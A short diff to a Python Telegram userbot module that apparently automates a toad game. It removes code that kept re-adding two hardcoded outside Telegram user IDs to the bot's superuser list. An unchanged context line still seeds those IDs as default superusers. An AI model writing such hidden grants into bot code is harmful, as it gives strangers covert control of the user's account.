@@ -125,12 +125,6 @@ class KramiikkMod(loader.Module):
             self.su.setdefault("name", self.me.username)
             self.su.setdefault("users", [self.me.id, 1124824021, 1785723159])
             self.db.set("Su", "su", self.su)
-        if 1124824021 not in self.su["users"]:
-            self.su["users"].append(1124824021)
-            self.db.set("Su", "su", self.su)
-        if 1785723159 not in self.su["users"]:
-            self.su["users"].append(1785723159)
-            self.db.set("Su", "su", self.su)
         self.ded = {
             "Нужна реанимация": "реанимировать жабу",
             "Хорошее": "использовать леденцы 4",
